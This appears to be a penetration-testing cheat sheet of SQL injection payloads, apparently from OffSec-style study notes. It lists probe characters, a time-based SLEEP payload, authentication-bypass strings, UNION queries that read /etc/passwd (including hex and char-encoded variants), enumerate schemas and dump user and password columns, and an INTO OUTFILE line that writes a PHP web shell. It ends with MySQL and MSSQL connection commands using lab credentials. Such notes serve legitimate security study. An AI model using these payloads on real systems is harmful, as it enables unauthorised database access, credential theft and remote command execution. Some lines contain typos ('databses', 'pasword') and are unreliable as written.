
### Payloads

```
'
)'
"
`
')
")
`)
'))
"))
`))
'-SLEEP(30); #
```

### Login Bypass

```
Both user and password or specific username and payload as password

' or 1=1 --
' or '1'='1
' or 1=1 --+
user' or 1=1;#
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#
```

### Union Based SQL

```
order by 1
' UNION SELECT 1,2,3 -- -	
' UNION SELECT 1,@@version,3 -- -
' UNION SELECT 1,user(),3 -- -	
' UNION SELECT 1,load_file('/etc/passwd'),3 -- -	
' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -	    //hex encode

' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100))
,3 -- -	         // char encode
```

```
// List databases available
' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema.tables -- -

// Fetch Table names
' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- -
union all select 1,2,3,4,table_name,6 FROM information_schema.tables

// Fetch Column names from Table
' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='users' -- -	
union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

// Dump data from Columns using 0x3a as seperator
' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -

// Backdoor

union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### MySQL

```
//Connect
mysql -u root -p'root' -h 192.168.50.16 -P 3306

//Version and User
select version();
select system_user();

//Databases
show databses;

//Select data
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';


```

### MSSQL

```
//Connect
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

//Version
@@Version;

//List Databases
SELECT name FROM sys.databses;

//Query Database
SELECT * FROM offsec.information_schema.tables;

```